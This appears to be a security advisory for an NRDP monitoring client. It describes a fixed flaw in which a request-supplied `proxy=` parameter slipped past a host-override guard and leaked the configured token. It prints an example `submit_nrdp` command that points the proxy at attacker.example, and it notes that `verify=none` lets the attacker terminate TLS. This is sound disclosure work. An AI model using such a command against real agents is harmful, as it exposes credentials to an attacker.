---
title: "NRDP: a request-supplied proxy sent the configured token through a caller-chosen host"
fixed_in: 0.22.0
severity: "Medium"
modules: [NRDPClient]
action: conditional
---
The client host-override guard (see
[Client credentials could be sent to a caller-chosen host](notices.md#client-credentials-could-be-sent-to-a-caller-chosen-host)
and [Two ways past the client host-override guard](notices.md#two-ways-past-the-client-host-override-guard))
decides on the destination the request ends up with. `proxy=` does not move
the destination — it decides which host the request is handed to on its way
there — so `submit_nrdp proxy=http://attacker.example:3128/ command=x result=0
message=x` left the configured address untouched, passed the guard, and had
the agent send the request, configured token included, to the attacker's
proxy. For an `http://` target the token arrived in the clear in the POST
body; for an `https://` one the caller could add `verify=none` and terminate
the TLS tunnel on the proxy. Anyone with `queries.execute` over REST, or an
NRPE peer with `allow arguments = true`, could do this; no on-path position
was needed. This was the third way past the guard.

`proxy` and `no proxy` are now treated as moving the request: while a target's
own credentials are in play, a request may not set either to something other
than what the target configured. A request that repeats the configured proxy,
a target with no credentials, a request that supplies its own token, and a
target with `allow host override = true` are unaffected, exactly as for
`host=`.

**What to do:** nothing, unless callers of yours pass `proxy=` or `no-proxy=`
on `submit_nrdp` against a target that carries a token. That is now refused
with the same message as a `host=` override. The remedies are the same too:
pass the token with the request, configure the proxied route as its own
target (with its `proxy`) and select it with `target=`, or set
`allow host override = true` on the target.
